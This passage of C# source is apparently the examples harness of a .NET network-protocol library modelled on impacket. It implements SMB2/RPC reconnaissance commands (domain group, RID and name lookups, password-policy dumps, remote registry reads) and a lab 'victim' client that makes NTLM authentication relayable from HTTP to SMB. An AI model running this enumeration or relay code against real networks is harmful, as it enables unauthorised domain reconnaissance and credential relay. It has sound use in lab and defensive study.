        Samr.CloseHandle(pipe, server.Handle);
        pipe.Close();
        client.TreeDisconnect(ipc.TreeId);
        return 0;
    }

    case "rpc-lookupid":
    {
        // RID -> name resolution via samr SamrLookupIdsInDomain (opnum 18): the reverse of
        // rpc-lookuprid, and how a tool turns RIDs (e.g. from a group membership) into names.
        if (args.Length < 5)
        {
            Console.Error.WriteLine("usage: rpc-lookupid <host> <user> <password> <rids-csv> [domain] [port]");
            return 2;
        }

        string host = args[1];
        string user = args[2];
        string password = args[3];
        uint[] targetRids = args[4]
            .Split(',', StringSplitOptions.RemoveEmptyEntries | StringSplitOptions.TrimEntries)
            .Select(uint.Parse).ToArray();
        string domain = args.Length >= 6 ? args[5] : string.Empty;
        int port = args.Length >= 7 ? int.Parse(args[6]) : 445;

        using var client = new Smb2Client();
        client.Connect(host, port);
        client.Negotiate();
        Smb2LoginResult login = client.Login(domain, user, password);
        if (!login.Authenticated)
        {
            Console.Error.WriteLine($"Login failed: {NtStatus.Describe(login.Round2Status)}");
            return 1;
        }

        Smb2TreeConnectResult ipc = client.TreeConnect($@"\\{host}\IPC$");
        DcerpcPipe pipe = DcerpcPipe.Open(client, ipc.TreeId, DcerpcInterface.Samr.Pipe);
        pipe.Bind(DcerpcInterface.Samr);

        SamrHandleResult server = Samr.Connect(pipe);
        SamrEnumResult domains = Samr.EnumerateDomains(pipe, server.Handle);
        string accountDomain = domains.Entries.Count > 0 ? domains.Entries[0].Name : string.Empty;
        (SamrSid? sid, uint lookupRc) = Samr.LookupDomain(pipe, server.Handle, accountDomain);
        if (sid is null)
        {
            Console.WriteLine($"LookupDomain failed: 0x{lookupRc:X8}");
            Samr.CloseHandle(pipe, server.Handle);
            pipe.Close();
            client.TreeDisconnect(ipc.TreeId);
            return 1;
        }

        SamrHandleResult dom = Samr.OpenDomain(pipe, server.Handle, sid);
        IReadOnlyList<SamrNameMapping> rows = Samr.LookupIds(pipe, dom.Handle, targetRids);

        Console.WriteLine($"RID -> name in {accountDomain} ({sid}):");
        foreach (SamrNameMapping row in rows)
        {
            Console.WriteLine(row.Resolved
                ? $"  RID {row.Rid,-6} {row.Name,-28} {row.UseName}"
                : $"  RID {row.Rid,-6} (unresolved: {row.UseName})");
        }

        Samr.CloseHandle(pipe, dom.Handle);
        Samr.CloseHandle(pipe, server.Handle);
        pipe.Close();
        client.TreeDisconnect(ipc.TreeId);
        return 0;
    }

    case "rpc-enumgroups":
    {
        // Domain group + alias enumeration via samr (the samrdump groups behavior):
        // SamrEnumerateGroupsInDomain (opnum 11) + SamrEnumerateAliasesInDomain (15).
        if (args.Length < 4)
        {
            Console.Error.WriteLine("usage: rpc-enumgroups <host> <user> <password> [domain] [port]");
            return 2;
        }

        string host = args[1];
        string user = args[2];
        string password = args[3];
        string domain = args.Length >= 5 ? args[4] : string.Empty;
        int port = args.Length >= 6 ? int.Parse(args[5]) : 445;

        using var client = new Smb2Client();
        client.Connect(host, port);
        client.Negotiate();
        Smb2LoginResult login = client.Login(domain, user, password);
        if (!login.Authenticated)
        {
            Console.Error.WriteLine($"Login failed: {NtStatus.Describe(login.Round2Status)}");
            return 1;
        }

        Smb2TreeConnectResult ipc = client.TreeConnect($@"\\{host}\IPC$");
        DcerpcPipe pipe = DcerpcPipe.Open(client, ipc.TreeId, DcerpcInterface.Samr.Pipe);
        pipe.Bind(DcerpcInterface.Samr);

        SamrHandleResult server = Samr.Connect(pipe);
        SamrEnumResult domains = Samr.EnumerateDomains(pipe, server.Handle);
        string accountDomain = domains.Entries.Count > 0 ? domains.Entries[0].Name : string.Empty;
        (SamrSid? sid, uint lookupRc) = Samr.LookupDomain(pipe, server.Handle, accountDomain);

        if (sid is not null)
        {
            SamrHandleResult dom = Samr.OpenDomain(pipe, server.Handle, sid);
            SamrEnumResult groups = Samr.EnumerateGroups(pipe, dom.Handle);
            SamrEnumResult aliases = Samr.EnumerateAliases(pipe, dom.Handle);

            Console.WriteLine($"Groups in {accountDomain} ({sid}), {groups.Entries.Count}:");
            foreach (SamrRidEntry g in groups.Entries)
            {
                Console.WriteLine($"  RID {g.Rid,-6} {g.Name}");
            }

            Console.WriteLine($"Aliases in {accountDomain}, {aliases.Entries.Count}:");
            foreach (SamrRidEntry a in aliases.Entries)
            {
                Console.WriteLine($"  RID {a.Rid,-6} {a.Name}");
            }

            Samr.CloseHandle(pipe, dom.Handle);
        }
        else
        {
            Console.WriteLine($"LookupDomain failed: 0x{lookupRc:X8}");
        }

        Samr.CloseHandle(pipe, server.Handle);
        pipe.Close();
        client.TreeDisconnect(ipc.TreeId);
        return 0;
    }

    case "rpc-passpol":
    {
        // Domain password + lockout policy via samr SamrQueryInformationDomain
        // (the enum4linux / samrdump password-policy dump).
        if (args.Length < 4)
        {
            Console.Error.WriteLine("usage: rpc-passpol <host> <user> <password> [domain] [port]");
            return 2;
        }

        string host = args[1];
        string user = args[2];
        string password = args[3];
        string domain = args.Length >= 5 ? args[4] : string.Empty;
        int port = args.Length >= 6 ? int.Parse(args[5]) : 445;

        using var client = new Smb2Client();
        client.Connect(host, port);
        client.Negotiate();
        Smb2LoginResult login = client.Login(domain, user, password);
        if (!login.Authenticated)
        {
            Console.Error.WriteLine($"Login failed: {NtStatus.Describe(login.Round2Status)}");
            return 1;
        }

        Smb2TreeConnectResult ipc = client.TreeConnect($@"\\{host}\IPC$");
        DcerpcPipe pipe = DcerpcPipe.Open(client, ipc.TreeId, DcerpcInterface.Samr.Pipe);
        pipe.Bind(DcerpcInterface.Samr);

        SamrHandleResult server = Samr.Connect(pipe);
        SamrEnumResult domains = Samr.EnumerateDomains(pipe, server.Handle);
        string accountDomain = domains.Entries.Count > 0 ? domains.Entries[0].Name : string.Empty;
        (SamrSid? sid, uint lookupRc) = Samr.LookupDomain(pipe, server.Handle, accountDomain);

        if (sid is not null)
        {
            SamrHandleResult dom = Samr.OpenDomain(pipe, server.Handle, sid);
            SamrPasswordPolicy pw = Samr.QueryPasswordPolicy(pipe, dom.Handle);
            SamrLockoutPolicy lk = Samr.QueryLockoutPolicy(pipe, dom.Handle);

            static string Days(double? d) => d is null ? "none" : $"{d.Value:0.##} days";
            bool complex = (pw.PasswordProperties & 0x1) != 0; // DOMAIN_PASSWORD_COMPLEX

            Console.WriteLine($"Password policy for {accountDomain} ({sid}) on {host}:");
            Console.WriteLine($"  Minimum password length: {pw.MinPasswordLength}");
            Console.WriteLine($"  Password history length: {pw.PasswordHistoryLength}");
            Console.WriteLine($"  Maximum password age:    {Days(Samr.RelativeTimeToDays(pw.MaxPasswordAge))}");
            Console.WriteLine($"  Minimum password age:    {Days(Samr.RelativeTimeToDays(pw.MinPasswordAge))}");
            Console.WriteLine($"  Complexity required:     {complex} (properties 0x{pw.PasswordProperties:x8})");
            Console.WriteLine($"  Lockout threshold:       {(lk.LockoutThreshold == 0 ? "none" : lk.LockoutThreshold.ToString())}");
            Console.WriteLine($"  Lockout duration:        {Days(Samr.RelativeTimeToDays(lk.LockoutDuration))}");
            Console.WriteLine($"  Lockout observation:     {Days(Samr.RelativeTimeToDays(lk.LockoutObservationWindow))}");

            Samr.CloseHandle(pipe, dom.Handle);
        }
        else
        {
            Console.WriteLine($"LookupDomain failed: 0x{lookupRc:X8}");
        }

        Samr.CloseHandle(pipe, server.Handle);
        pipe.Close();
        client.TreeDisconnect(ipc.TreeId);
        return 0;
    }

    case "rpc-lookupnames":
    {
        // Name->SID recon via lsat LsarLookupNames (inverse of lookupsid).
        if (args.Length < 4)
        {
            Console.Error.WriteLine("usage: rpc-lookupnames <host> <user> <password> [names csv] [domain] [port]");
            return 2;
        }

        string host = args[1];
        string user = args[2];
        string password = args[3];
        string[] names = args.Length >= 5 ? args[4].Split(',') : new[] { "labuser", "Everyone", "Administrator" };
        string domain = args.Length >= 6 ? args[5] : string.Empty;
        int port = args.Length >= 7 ? int.Parse(args[6]) : 445;

        using var client = new Smb2Client();
        client.Connect(host, port);
        client.Negotiate();
        Smb2LoginResult login = client.Login(domain, user, password);
        if (!login.Authenticated)
        {
            Console.Error.WriteLine($"Login failed: {NtStatus.Describe(login.Round2Status)}");
            return 1;
        }

        Smb2TreeConnectResult ipc = client.TreeConnect($@"\\{host}\IPC$");
        DcerpcPipe pipe = DcerpcPipe.Open(client, ipc.TreeId, DcerpcInterface.Lsarpc.Pipe);
        pipe.Bind(DcerpcInterface.Lsarpc);

        ScHandleResult policy = Lsarpc.OpenPolicy2(pipe);
        IReadOnlyList<LsaResolvedName> resolved = Lsat.LookupNames(pipe, policy.Handle, names);
        Lsarpc.Close(pipe, policy.Handle);
        pipe.Close();
        client.TreeDisconnect(ipc.TreeId);

        Console.WriteLine($"Name lookups on {host}:");
        foreach (LsaResolvedName r in resolved)
        {
            bool ok = r.Use != SidNameUse.Unknown && r.Use != SidNameUse.Invalid && !string.IsNullOrEmpty(r.Sid);
            Console.WriteLine($"  {r.InputName,-20} {(ok ? $"{r.Sid} ({r.Use})" : "(unresolved)")}");
        }

        return 0;
    }

    case "rpc-lookupnames2":
    {
        // Name->SID recon via lsat LsarLookupNames2 (opnum 58) — the variant modern Windows
        // clients use (adds LookupOptions + ClientRevision; EX translated-SID records).
        if (args.Length < 4)
        {
            Console.Error.WriteLine("usage: rpc-lookupnames2 <host> <user> <password> [names csv] [domain] [port]");
            return 2;
        }

        string host = args[1];
        string user = args[2];
        string password = args[3];
        string[] names = args.Length >= 5 ? args[4].Split(',') : new[] { "Administrator", "Guest", "Domain Admins" };
        string domain = args.Length >= 6 ? args[5] : string.Empty;
        int port = args.Length >= 7 ? int.Parse(args[6]) : 445;

        using var client = new Smb2Client();
        client.Connect(host, port);
        client.Negotiate();
        Smb2LoginResult login = client.Login(domain, user, password);
        if (!login.Authenticated)
        {
            Console.Error.WriteLine($"Login failed: {NtStatus.Describe(login.Round2Status)}");
            return 1;
        }

        Smb2TreeConnectResult ipc = client.TreeConnect($@"\\{host}\IPC$");
        DcerpcPipe pipe = DcerpcPipe.Open(client, ipc.TreeId, DcerpcInterface.Lsarpc.Pipe);
        pipe.Bind(DcerpcInterface.Lsarpc);

        ScHandleResult policy = Lsarpc.OpenPolicy2(pipe);
        IReadOnlyList<LsaResolvedName> resolved = Lsat.LookupNames2(pipe, policy.Handle, names);
        Lsarpc.Close(pipe, policy.Handle);
        pipe.Close();
        client.TreeDisconnect(ipc.TreeId);

        Console.WriteLine($"Name lookups (LookupNames2) on {host}:");
        foreach (LsaResolvedName r in resolved)
        {
            bool ok = r.Use != SidNameUse.Unknown && r.Use != SidNameUse.Invalid && !string.IsNullOrEmpty(r.Sid);
            Console.WriteLine($"  {r.InputName,-20} {(ok ? $"{r.Sid} ({r.Use})" : "(unresolved)")}");
        }

        return 0;
    }

    case "rpc-reg":
    {
        // Remote-registry recon via winreg (MS-RRP): open HKLM, read its version,
        // open a subkey, then release the handles. The impacket reg.py surface.
        if (args.Length < 4)
        {
            Console.Error.WriteLine("usage: rpc-reg <host> <user> <password> [subkey] [domain] [port]");
            return 2;
        }

        string host = args[1];
        string user = args[2];
        string password = args[3];
        string subKey = args.Length >= 5 ? args[4] : @"SOFTWARE\Microsoft\Windows NT\CurrentVersion";
        string domain = args.Length >= 6 ? args[5] : string.Empty;
        int port = args.Length >= 7 ? int.Parse(args[6]) : 445;

        using var client = new Smb2Client();
        client.Connect(host, port);
        client.Negotiate();
        Smb2LoginResult login = client.Login(domain, user, password);
        if (!login.Authenticated)
        {
            Console.Error.WriteLine($"Login failed: {NtStatus.Describe(login.Round2Status)}");
            return 1;
        }

        Smb2TreeConnectResult ipc = client.TreeConnect($@"\\{host}\IPC$");
        DcerpcPipe pipe = DcerpcPipe.Open(client, ipc.TreeId, DcerpcInterface.Winreg.Pipe);
        pipe.Bind(DcerpcInterface.Winreg);

        Console.WriteLine($"Remote registry on {host}:");
        ScHandleResult hklm = Winreg.OpenHklm(pipe);
        Console.WriteLine($"  OpenHKLM:   {(hklm.Success ? "OK" : $"0x{hklm.ReturnCode:X8}")}");
        if (hklm.Success)
        {
            (uint version, uint vStatus) = Winreg.GetVersion(pipe, hklm.Handle);
            Console.WriteLine($"  GetVersion: {(vStatus == 0 ? version.ToString() : $"0x{vStatus:X8}")}");

            ScHandleResult key = Winreg.OpenKey(pipe, hklm.Handle, subKey);
            Console.WriteLine($"  OpenKey {subKey}: {(key.Success ? "OK" : $"0x{key.ReturnCode:X8}")}");
            if (key.Success)
            {
                Winreg.CloseKey(pipe, key.Handle);
            }

            Winreg.CloseKey(pipe, hklm.Handle);
        }

        pipe.Close();
        client.TreeDisconnect(ipc.TreeId);
        return 0;
    }

    case "rpc-regquery":
    {
        // Read a named registry value via winreg: OpenHKLM -> OpenKey(subkey) ->
        // BaseRegQueryValue(value). The reg.py "reg query KEY -v VALUE" recon.
        if (args.Length < 6)
        {
            Console.Error.WriteLine("usage: rpc-regquery <host> <user> <password> <subkey> <value> [domain] [port]");
            return 2;
        }

        string host = args[1];
        string user = args[2];
        string password = args[3];
        string subKey = args[4];
        string valueName = args[5];
        string domain = args.Length >= 7 ? args[6] : string.Empty;
        int port = args.Length >= 8 ? int.Parse(args[7]) : 445;

        using var client = new Smb2Client();
        client.Connect(host, port);
        client.Negotiate();
        Smb2LoginResult login = client.Login(domain, user, password);
        if (!login.Authenticated)
        {
            Console.Error.WriteLine($"Login failed: {NtStatus.Describe(login.Round2Status)}");
            return 1;
        }

        Smb2TreeConnectResult ipc = client.TreeConnect($@"\\{host}\IPC$");
        DcerpcPipe pipe = DcerpcPipe.Open(client, ipc.TreeId, DcerpcInterface.Winreg.Pipe);
        pipe.Bind(DcerpcInterface.Winreg);

        ScHandleResult hklm = Winreg.OpenHklm(pipe);
        if (!hklm.Success)
        {
            Console.Error.WriteLine($"OpenHKLM failed: 0x{hklm.ReturnCode:X8}");
            return 1;
        }

        ScHandleResult key = Winreg.OpenKey(pipe, hklm.Handle, subKey);
        if (!key.Success)
        {
            Console.Error.WriteLine($"OpenKey {subKey} failed: 0x{key.ReturnCode:X8}");
            return 1;
        }

        Winreg.RegValue value = Winreg.QueryValue(pipe, key.Handle, valueName);
        Winreg.CloseKey(pipe, key.Handle);
        Winreg.CloseKey(pipe, hklm.Handle);
        pipe.Close();
        client.TreeDisconnect(ipc.TreeId);

        if (!value.Success)
        {
            Console.WriteLine($"HKLM\\{subKey} : {valueName} -> query failed 0x{value.ReturnCode:X8}");
            return 0;
        }

        Console.WriteLine($"HKLM\\{subKey}");
        Console.WriteLine($"  {valueName}  ({value.TypeName})  =  {value.AsText}");
        return 0;
    }

    case "rpc-regenum":
    {
        // Enumerate all values under a registry key via winreg BaseRegEnumValue
        // (reg.py "reg query KEY" — list the key's values). OpenHKLM -> OpenKey -> loop.
        if (args.Length < 4)
        {
            Console.Error.WriteLine("usage: rpc-regenum <host> <user> <password> [subkey] [domain] [port]");
            return 2;
        }

        string host = args[1];
        string user = args[2];
        string password = args[3];
        string subKey = args.Length >= 5 ? args[4] : @"SOFTWARE\Microsoft\Windows NT\CurrentVersion";
        string domain = args.Length >= 6 ? args[5] : string.Empty;
        int port = args.Length >= 7 ? int.Parse(args[6]) : 445;

        using var client = new Smb2Client();
        client.Connect(host, port);
        client.Negotiate();
        Smb2LoginResult login = client.Login(domain, user, password);
        if (!login.Authenticated)
        {
            Console.Error.WriteLine($"Login failed: {NtStatus.Describe(login.Round2Status)}");
            return 1;
        }

        Smb2TreeConnectResult ipc = client.TreeConnect($@"\\{host}\IPC$");
        DcerpcPipe pipe = DcerpcPipe.Open(client, ipc.TreeId, DcerpcInterface.Winreg.Pipe);
        pipe.Bind(DcerpcInterface.Winreg);

        ScHandleResult hklm = Winreg.OpenHklm(pipe);
        if (!hklm.Success)
        {
            Console.Error.WriteLine($"OpenHKLM failed: 0x{hklm.ReturnCode:X8}");
            return 1;
        }

        ScHandleResult key = Winreg.OpenKey(pipe, hklm.Handle, subKey);
        if (!key.Success)
        {
            Console.Error.WriteLine($"OpenKey {subKey} failed: 0x{key.ReturnCode:X8}");
            return 1;
        }

        IReadOnlyList<Winreg.RegNamedValue> values = Winreg.EnumerateValues(pipe, key.Handle);
        Winreg.CloseKey(pipe, key.Handle);
        Winreg.CloseKey(pipe, hklm.Handle);
        pipe.Close();
        client.TreeDisconnect(ipc.TreeId);

        Console.WriteLine($"HKLM\\{subKey}  ({values.Count} values):");
        foreach (Winreg.RegNamedValue v in values)
        {
            Console.WriteLine($"  {v.Name,-20} ({v.TypeName})  =  {v.AsText}");
        }

        return 0;
    }

    case "rpc-regkeys":
    {
        // Enumerate a registry key's subkeys via winreg BaseRegEnumKey (reg.py key walk):
        // OpenHKLM -> OpenKey -> loop dwIndex until ERROR_NO_MORE_ITEMS.
        if (args.Length < 4)
        {
            Console.Error.WriteLine("usage: rpc-regkeys <host> <user> <password> [subkey] [domain] [port]");
            return 2;
        }

        string host = args[1];
        string user = args[2];
        string password = args[3];
        string subKey = args.Length >= 5 ? args[4] : @"SOFTWARE\Microsoft";
        string domain = args.Length >= 6 ? args[5] : string.Empty;
        int port = args.Length >= 7 ? int.Parse(args[6]) : 445;

        using var client = new Smb2Client();
        client.Connect(host, port);
        client.Negotiate();
        Smb2LoginResult login = client.Login(domain, user, password);
        if (!login.Authenticated)
        {
            Console.Error.WriteLine($"Login failed: {NtStatus.Describe(login.Round2Status)}");
            return 1;
        }

        Smb2TreeConnectResult ipc = client.TreeConnect($@"\\{host}\IPC$");
        DcerpcPipe pipe = DcerpcPipe.Open(client, ipc.TreeId, DcerpcInterface.Winreg.Pipe);
        pipe.Bind(DcerpcInterface.Winreg);

        ScHandleResult hklm = Winreg.OpenHklm(pipe);
        if (!hklm.Success)
        {
            Console.Error.WriteLine($"OpenHKLM failed: 0x{hklm.ReturnCode:X8}");
            return 1;
        }

        ScHandleResult key = Winreg.OpenKey(pipe, hklm.Handle, subKey);
        if (!key.Success)
        {
            Console.Error.WriteLine($"OpenKey {subKey} failed: 0x{key.ReturnCode:X8}");
            return 1;
        }

        IReadOnlyList<string> subkeys = Winreg.EnumerateKeys(pipe, key.Handle);
        Winreg.CloseKey(pipe, key.Handle);
        Winreg.CloseKey(pipe, hklm.Handle);
        pipe.Close();
        client.TreeDisconnect(ipc.TreeId);

        Console.WriteLine($"HKLM\\{subKey}  ({subkeys.Count} subkeys):");
        foreach (string k in subkeys)
        {
            Console.WriteLine($"  {k}");
        }

        return 0;
    }

    case "smb2-ls":
    {
        // Directory listing over SMB2: TREE_CONNECT + CREATE(dir) + QUERY_DIRECTORY + CLOSE.
        if (args.Length < 5)
        {
            Console.Error.WriteLine("usage: smb2-ls <host> <share> <user> <password> [path] [domain] [port]");
            return 2;
        }

        string host = args[1];
        string share = args[2];
        string user = args[3];
        string password = args[4];
        string path = args.Length >= 6 ? args[5] : string.Empty;
        string domain = args.Length >= 7 ? args[6] : string.Empty;
        int port = args.Length >= 8 ? int.Parse(args[7]) : 445;

        using var client = new Smb2Client();
        client.Connect(host, port);
        client.Negotiate();
        Smb2LoginResult login = client.Login(domain, user, password);
        if (!login.Authenticated)
        {
            Console.Error.WriteLine($"Login failed: {NtStatus.Describe(login.Round2Status)}");
            return 1;
        }

        Smb2TreeConnectResult tree = client.TreeConnect($@"\\{host}\{share}");
        if (!tree.Connected)
        {
            Console.Error.WriteLine($"Tree connect failed: {NtStatus.Describe(tree.Status)}");
            return 1;
        }

        IReadOnlyList<Smb2DirectoryEntry> entries = client.ListDirectory(tree.TreeId, path);
        client.TreeDisconnect(tree.TreeId);

        string display = string.IsNullOrEmpty(path) ? $@"\\{host}\{share}" : $@"\\{host}\{share}\{path}";
        Console.WriteLine($"Listing {display} ({entries.Count} entries):");
        foreach (Smb2DirectoryEntry e in entries)
        {
            Console.WriteLine($"  {(e.IsDirectory ? "<DIR>" : "     ")} {e.EndOfFile,12} {e.Name}");
        }

        return 0;
    }

    case "smb2-info":
    {
        // File-system info over SMB2: CREATE(root) + QUERY_INFO (volume + size).
        if (args.Length < 5)
        {
            Console.Error.WriteLine("usage: smb2-info <host> <share> <user> <password> [domain] [port]");
            return 2;
        }

        string host = args[1];
        string share = args[2];
        string user = args[3];
        string password = args[4];
        string domain = args.Length >= 6 ? args[5] : string.Empty;
        int port = args.Length >= 7 ? int.Parse(args[6]) : 445;

        using var client = new Smb2Client();
        client.Connect(host, port);
        client.Negotiate();
        Smb2LoginResult login = client.Login(domain, user, password);
        if (!login.Authenticated)
        {
            Console.Error.WriteLine($"Login failed: {NtStatus.Describe(login.Round2Status)}");
            return 1;
        }

        Smb2TreeConnectResult tree = client.TreeConnect($@"\\{host}\{share}");
        (Smb2VolumeInfo volume, Smb2FsSizeInfo size) = client.QueryFileSystemInfo(tree.TreeId);
        client.TreeDisconnect(tree.TreeId);

        Console.WriteLine($@"Filesystem info for \\{host}\{share}:");
        Console.WriteLine($"  Volume label:  {(string.IsNullOrEmpty(volume.Label) ? "(none)" : volume.Label)}");
        Console.WriteLine($"  Volume serial: 0x{volume.SerialNumber:x8}");
        Console.WriteLine($"  Total space:   {size.TotalBytes / (1024 * 1024)} MiB");
        Console.WriteLine($"  Free space:    {size.AvailableBytes / (1024 * 1024)} MiB");
        return 0;
    }

    case "smb-attrib":
    case "smb-attrib-set":
    {
        // attrib.py: query or set a file/directory's DOS attributes over pure SMB2
        // (QUERY_INFO / SET_INFO FileBasicInformation). Benign.
        //   smb-attrib     <host> <share> <path> <user> <password> [domain] [port]
        //   smb-attrib-set <host> <share> <path> <user> <password> <attrs> [domain] [port]
        // <attrs>: letters among R(eadonly) H(idden) S(ystem) A(rchive) N(ormal) T(emporary), or "clear".
        bool setMode = args[0] == "smb-attrib-set";
        int minArgs = setMode ? 7 : 6;
        if (args.Length < minArgs)
        {
            Console.Error.WriteLine(setMode
                ? "usage: smb-attrib-set <host> <share> <path> <user> <password> <attrs> [domain] [port]"
                : "usage: smb-attrib <host> <share> <path> <user> <password> [domain] [port]");
            return 2;
        }

        string host = args[1];
        string share = args[2];
        string path = args[3].Replace('/', '\\').TrimStart('\\');
        string user = args[4];
        string password = args[5];
        string attrSpec = setMode ? args[6] : string.Empty;
        int tail = setMode ? 7 : 6;
        string domain = args.Length > tail ? args[tail] : string.Empty;
        int port = args.Length > tail + 1 ? int.Parse(args[tail + 1]) : 445;

        static string Format(Smb2FileAttributes a) =>
            (a.HasFlag(Smb2FileAttributes.ReadOnly) ? "R" : "-") +
            (a.HasFlag(Smb2FileAttributes.Hidden) ? "H" : "-") +
            (a.HasFlag(Smb2FileAttributes.System) ? "S" : "-") +
            (a.HasFlag(Smb2FileAttributes.Directory) ? "D" : "-") +
            (a.HasFlag(Smb2FileAttributes.Archive) ? "A" : "-") +
            (a.HasFlag(Smb2FileAttributes.Normal) ? "N" : "-") +
            (a.HasFlag(Smb2FileAttributes.Temporary) ? "T" : "-");

        static Smb2FileAttributes Parse(string spec)
        {
            if (spec.Equals("clear", StringComparison.OrdinalIgnoreCase) || spec.Equals("none", StringComparison.OrdinalIgnoreCase))
                return Smb2FileAttributes.Normal;
            Smb2FileAttributes a = 0;
            foreach (char c in spec.ToUpperInvariant())
            {
                a |= c switch
                {
                    'R' => Smb2FileAttributes.ReadOnly,
                    'H' => Smb2FileAttributes.Hidden,
                    'S' => Smb2FileAttributes.System,
                    'A' => Smb2FileAttributes.Archive,
                    'N' => Smb2FileAttributes.Normal,
                    'T' => Smb2FileAttributes.Temporary,
                    _ => 0,
                };
            }
            return a == 0 ? Smb2FileAttributes.Normal : a;
        }

        using var client = new Smb2Client();
        client.Connect(host, port);
        client.Negotiate();
        Smb2LoginResult login = client.Login(domain, user, password);
        if (!login.Authenticated)
        {
            Console.Error.WriteLine($"Login failed: {NtStatus.Describe(login.Round2Status)}");
            return 1;
        }

        Smb2TreeConnectResult tree = client.TreeConnect($@"\\{host}\{share}");
        // Open with only the access we need, and no create-option restriction (works on a dir too).
        Smb2AccessMask access = setMode ? Smb2AccessMask.FileWriteAttributes : Smb2AccessMask.FileReadAttributes;
        Smb2CreateResult open = client.Create(tree.TreeId, path, access, Smb2CreateDisposition.Open, 0);
        if (!open.Succeeded)
        {
            Console.Error.WriteLine($"Could not open '{path}': {NtStatus.Describe(open.Status)}");
            client.TreeDisconnect(tree.TreeId);
            return 1;
        }

        try
        {
            if (setMode)
            {
                Smb2FileAttributes want = Parse(attrSpec);
                uint rc = client.SetInfo(tree.TreeId, open.Response.FileId, Smb2InfoType.File,
                    (byte)Smb2FileInfoType.FileBasicInformation, FileBasicInformation.ForAttributes(want));
                if (rc != NtStatus.Success)
                {
                    Console.Error.WriteLine($"SET_INFO failed: {NtStatus.Describe(rc)}");
                    return 1;
                }

                Console.WriteLine($@"Set {Format(want)}  \\{host}\{share}\{path}");
            }
            else
            {
                byte[] buf = client.QueryInfo(tree.TreeId, open.Response.FileId, Smb2InfoType.File,
                    (byte)Smb2FileInfoType.FileBasicInformation);
                Smb2FileAttributes attrs = FileBasicInformation.ParseAttributes(buf);
                Console.WriteLine($@"{Format(attrs)}  \\{host}\{share}\{path}  (0x{(uint)attrs:x})");
            }
        }
        finally
        {
            client.Close(tree.TreeId, open.Response.FileId);
            client.TreeDisconnect(tree.TreeId);
        }

        return 0;
    }

    case "-h":
    case "--help":
    case "help":
        PrintUsage();
        return 0;

    default:
        Console.Error.WriteLine($"Unknown command '{args[0]}'. Run with no arguments for usage.");
        return 1;
}

// Decode a GPP XML file's bytes to text, honoring a UTF-8/UTF-16 BOM (GPP files are
// typically UTF-8; some are UTF-16). Falls back to UTF-8 without a BOM.
static string DecodeXml(byte[] raw)
{
    if (raw.Length >= 2 && raw[0] == 0xFF && raw[1] == 0xFE)
        return System.Text.Encoding.Unicode.GetString(raw, 2, raw.Length - 2);
    if (raw.Length >= 2 && raw[0] == 0xFE && raw[1] == 0xFF)
        return System.Text.Encoding.BigEndianUnicode.GetString(raw, 2, raw.Length - 2);
    if (raw.Length >= 3 && raw[0] == 0xEF && raw[1] == 0xBB && raw[2] == 0xBF)
        return System.Text.Encoding.UTF8.GetString(raw, 3, raw.Length - 3);
    return System.Text.Encoding.UTF8.GetString(raw);
}

// Resolve a sAMAccountName to its object DN via LDAP search (used by badsuccessor).
static string ResolveDn(DotNetPacket.Protocols.Ldap.LdapConnection ldap, string baseDn, string sam)
{
    var es = ldap.Search(baseDn,
        DotNetPacket.Protocols.Ldap.LdapFilter.AllOf(
            DotNetPacket.Protocols.Ldap.LdapFilter.PresentOf("objectClass"),
            DotNetPacket.Protocols.Ldap.LdapFilter.Equal("sAMAccountName", sam)),
        new[] { "distinguishedName" });
    return es.Count > 0 ? es[0].ObjectName : string.Empty;
}

// A minimal HTTP NTLM victim (lab demo): authenticates to the relay listener over HTTP so the whole
// HTTP->SMB relay runs on loopback. Mirrors a browser/WebDAV client doing WWW-Authenticate: NTLM.
static void HttpNtlmVictim(string host, int port, string domain, string user, string password)
{
    using var tcp = new System.Net.Sockets.TcpClient();
    tcp.Connect(host, port);
    using System.Net.Sockets.NetworkStream s = tcp.GetStream();
    s.ReadTimeout = 15_000;
    // Bare HTTP NTLM (no SPNEGO): a real browser/WebDAV client does NOT assert an NTLM MIC, since
    // there is no SPNEGO mechListMIC to back it. This is precisely what lets an HTTP victim be relayed
    // to SMB — the relay cannot forge a mechListMIC, so a MIC-asserting Type 3 would be rejected.
    var ntlm = new DotNetPacket.Protocols.Ntlm.NtlmClient { IncludeMic = false };

    void Get(string? authorization)
    {
        var sb = new System.Text.StringBuilder();
        sb.Append("GET / HTTP/1.1\r\n").Append($"Host: {host}:{port}\r\n");
        if (authorization is not null)
        {
            sb.Append("Authorization: ").Append(authorization).Append("\r\n");
        }

        sb.Append("Connection: keep-alive\r\n\r\n");
        byte[] b = System.Text.Encoding.ASCII.GetBytes(sb.ToString());
        s.Write(b, 0, b.Length);
        s.Flush();
    }

    Dictionary<string, string> ReadResponse()
    {
        var headers = new Dictionary<string, string>(StringComparer.OrdinalIgnoreCase);
        string ReadLine()
        {
            var sb = new System.Text.StringBuilder();
            int prev = -1;
            while (true)
            {
                int c = s.ReadByte();
                if (c < 0) return sb.ToString();
                if (prev == '\r' && c == '\n') { sb.Length -= 1; return sb.ToString(); }
                sb.Append((char)c);
                prev = c;
            }
        }

        ReadLine(); // status line
        while (true)
        {
            string line = ReadLine();
            if (line.Length == 0) break;
            int colon = line.IndexOf(':');
            if (colon > 0) headers[line[..colon].Trim()] = line[(colon + 1)..].Trim();
        }

        if (headers.TryGetValue("content-length", out string? cl) && int.TryParse(cl, out int len) && len > 0)
        {
            var body = new byte[len];
            int read = 0;
            while (read < len) { int n = s.Read(body, read, len - read); if (n <= 0) break; read += n; }
        }

        return headers;
    }

    Get(null);
    ReadResponse();                                            // 401 WWW-Authenticate: NTLM
    Get("NTLM " + Convert.ToBase64String(ntlm.CreateNegotiate()));
    Dictionary<string, string> challengeHeaders = ReadResponse(); // 401 with the relayed Type 2
    byte[] type2 = Convert.FromBase64String(challengeHeaders["WWW-Authenticate"].Substring(5).Trim());
    DotNetPacket.Protocols.Ntlm.NtlmAuthResult auth = ntlm.CreateAuthenticate(type2, domain, user, password);
    Get("NTLM " + Convert.ToBase64String(auth.Message));
    ReadResponse();                                            // 200 / 401
}

static void PrintUsage()
{
    Console.WriteLine("DotNetPacket examples (SOC lab harness)");
    Console.WriteLine();
    Console.WriteLine("Usage: netpacket-examples <command>");
    Console.WriteLine();
    Console.WriteLine("Commands:");
    Console.WriteLine("  smb-header       Build a sample SMBv1 header and hex-dump its bytes.");
    Console.WriteLine("  ntlm-negotiate   Build a sample NTLMSSP NEGOTIATE message and hex-dump its bytes.");
    Console.WriteLine("  smb2-negotiate <host> [port]");
    Console.WriteLine("                   Perform a live SMB2 NEGOTIATE against a host and dump both directions.");
